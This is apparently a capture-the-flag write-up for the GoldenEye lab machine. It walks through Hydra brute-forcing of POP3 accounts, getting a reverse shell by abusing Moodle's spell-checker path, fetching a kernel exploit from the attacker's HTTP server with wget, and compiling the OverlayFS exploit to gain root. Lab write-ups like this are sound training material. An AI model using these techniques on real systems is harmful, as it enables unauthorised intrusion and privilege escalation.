## 1. Enumeration

### Nmap Scan

First, I scanned the network to identify the target and the services running on it.

```bash
nmap -sV 192.168.56.0/24
```

The scan revealed:

- **HTTP** – Port 80
    
- **POP3** – Two ports
    
- **SMTP** – One port
    

The web application on port 80 was the main starting point.

---

## 2. Web Enumeration

I accessed:

```text
http://192.168.56.114/sev-home/
```

The page required credentials, which I did not have.

I checked the **page source code** and found a message containing an encoded password:

```text
Boris, make sure you update your default password.
My sources say MI6 maybe planning to infiltrate.
Be on the lookout for any suspicious network traffic....

I encoded you p@ssword below...

&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

BTW Natalya says she can break your codes
```

Decoding the HTML entities revealed:

```text
InvincibleHack3r
```

### Credentials

```text
Username: boris
Password: InvincibleHack3r
```

I used these credentials to access `/sev-home/`.

---

# 3. POP3 Enumeration

The `/sev-home/` page contained a hint:

```text
Remember, since security by obscurity is very effective, we have configured our
pop3 service to run on a very high non-default port
```

The Nmap scan showed the POP3 service running on port:

```text
55007
```

### Testing Boris's Credentials

I connected to the POP3 service:

```bash
nc -nv 192.168.56.114 55007
```

Then tried:

```text
USER boris
PASS InvincibleHack3r
```

The login failed.

This indicated that Boris's web password was different from his email password.

---

## 3.1 Brute-Forcing Boris's Password

I used Hydra against the POP3 service:

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.114 -s 55007 pop3
```

Password discovered:

```text
Username: boris
Password: secret1!
```

I logged in again:

```bash
nc -nv 192.168.56.114 55007
```

```text
USER boris
PASS secret1!
```

---

## 3.2 Reading Boris's Emails

I used the following POP3 commands:

```text
STAT
```

Displays the number of emails and mailbox size.

```text
RETR 1
```

Reads email number 1.

```text
RETR 2
```

Reads email number 2.

The emails revealed information about other users, including:

```text
Natalya
Xenia
```

---

# 4. Natalya

I attempted to brute-force Natalya's POP3 password:

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.114 -s 55007 pop3
```

Password discovered:

```text
Username: natalya
Password: bird
```

---

# 5. Xenia

The emails also revealed another user:

```text
Username: xenia
Password: RCP90rulez!
```

Further information indicated that I should add the following domain to `/etc/hosts`:

```text
severnaya-station.com
```

I then accessed:

```text
http://severnaya-station.com/gnocerdir
```

I logged in using Xenia's credentials:

```text
Username: xenia
Password: RCP90rulez!
```

---

# 6. Doak

The application revealed another user:

```text
doak
```

I attempted to brute-force the account:

```bash
hydra -l dr_doak -P /usr/share/wordlists/fasttrack.txt -f severnaya-station.com -s 55007 pop3
```

Credentials discovered:

```text
Username: dr_doak
Password: 4England!
```

I accessed Doak's mailbox and found:

```text
s3cret.txt
```

---

# 7. Finding the Moodle Administrator Credentials

The contents of `s3cret.txt` contained an important clue:

```text
I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I
cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg
```

I navigated to:

```text
/dir007key/for-007.jpg
```

I downloaded/analyzed the image using:

```bash
exiftool for-007.jpg
```

The metadata contained an encoded value.

After decoding it with CyberChef, I obtained:

```text
xWinter1995x!
```

### Moodle Credentials

```text
Username: admin
Password: xWinter1995x!
```

---

# 8. Moodle Admin Access

I logged into the Moodle web application:

```text
Username: admin
Password: xWinter1995x!
```

After gaining administrator access, I looked for a way to execute commands on the server.

I researched Moodle privilege-escalation techniques and found that the **spell checker configuration** could be abused to execute commands when an administrator controls the spell-checker path.

The relevant location was:

```text
Site Administration
        ↓
Server
        ↓
System Paths
```

---

# 9. Getting a Reverse Shell

I configured the spell-checker path to execute a reverse-shell payload.

I then started a listener on my Kali machine:

```bash
nc -nlvp 4444
```

After configuring the spell-checker engine as:

```text
PSpellShell
```

I triggered the spell-check functionality from a new blog entry.

The connection was received by my listener, giving me shell access.

The shell initially appeared in:

```text
/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker
```

---

# 10. Local Enumeration

I moved to `/home`:

```bash
cd /home
```

Then listed the directories:

```bash
ls -al
```

I found:

```text
boris
doak
natalya
```

I checked these directories for useful files, credentials, and flags, but did not find anything immediately useful.

---

## 10.1 Checking User Accounts

I also attempted to switch to the discovered accounts:

```bash
su boris
```

The available credentials did not work for local authentication.

---

# 11. Privilege Escalation

At this stage, I needed to escalate from the current low-privileged shell to **root**.

I checked common privilege-escalation vectors.

### Sudo Permissions

```bash
sudo -l
```

No useful sudo permissions were found.

### SUID Enumeration

I also checked for potentially exploitable SUID binaries.

No useful SUID privilege-escalation path was identified.

### Kernel Version

I checked the kernel version:

```bash
uname -a
```

The machine was running:

```text
3.13.0-32-generic
```

This was an outdated Linux kernel, so I searched for known local privilege-escalation exploits.

---

# 12. Searching for a Kernel Exploit

I searched Exploit-DB using SearchSploit:

```bash
searchsploit linux 3.13 overlayfs
```

I found:

```text
Linux Kernel 3.13.0 < 3.19
(Ubuntu 12.04/14.04/14.10/15.04)
'overlayfs' Local Privilege Escalation

linux/local/37292.c
```

I copied the exploit:

```bash
searchsploit -m linux/local/37292.c
```

---

# 13. Preparing the Exploit

I checked whether a C compiler was available.

`gcc` was not available, so I checked for:

```bash
cc
```

The `cc` compiler was available.

I opened the exploit:

```bash
nano 37292.c
```

I modified the exploit so that it used `cc` instead of `gcc`.

---

# 14. Transferring the Exploit

On my Kali machine, I started a Python HTTP server:

```bash
python3 -m http.server 8000
```

On the target machine, I moved to `/tmp`:

```bash
cd /tmp
```

Then downloaded the exploit:

```bash
wget http://192.168.56.101:8000/37292.c
```

I verified the file:

```bash
ls -al
```

---

# 15. Compiling the Exploit

I compiled the exploit using `cc`:

```bash
cc 37292.c -o ofs
```

Then checked that the compiled binary existed:

```bash
ls -al
```

I executed the exploit:

```bash
./ofs
```

Finally, I checked my privileges:

```bash
whoami
```

The result:

```text
root
```

🎉 **Root access obtained!**

---

# 16. Getting the Final Flag

![[WhatsApp Image 2026-08-09 at 11.33.06.jpeg]]

I listed the root directory:

```bash
ls -al
```
<img width="1600" height="869" alt="WhatsApp Image 2026-08-09 at 11 33 06" src="https://github.com/user-attachments/assets/9248a07e-0809-47fd-a230-173033813028" />

I found:

```text
.flag.txt
```

I read it using:

```bash
cat .flag.txt
```

The flag pointed me to:

```text
/006-final/xvf7-flag/
```



I navigated to the directory and completed the GoldenEye box.

<img width="1600" height="869" alt="WhatsApp Image 2026-08-09 at 11 30 27" src="https://github.com/user-attachments/assets/4d60272a-f121-4979-856f-d2874d11bb61" />


---

# 17. Attack Path

```text
Nmap Enumeration
        ↓
Web Application
        ↓
Source Code
        ↓
Boris Credentials
        ↓
POP3 Enumeration
        ↓
Boris Password
        ↓
Email Enumeration
        ↓
Natalya / Xenia
        ↓
severnaya-station.com
        ↓
Doak
        ↓
s3cret.txt
        ↓
for-007.jpg
        ↓
Moodle Admin Credentials
        ↓
Moodle Spell Checker Abuse
        ↓
Reverse Shell
        ↓
Kernel Enumeration
        ↓
OverlayFS Exploit
        ↓
Root
        ↓
Final Flag
```

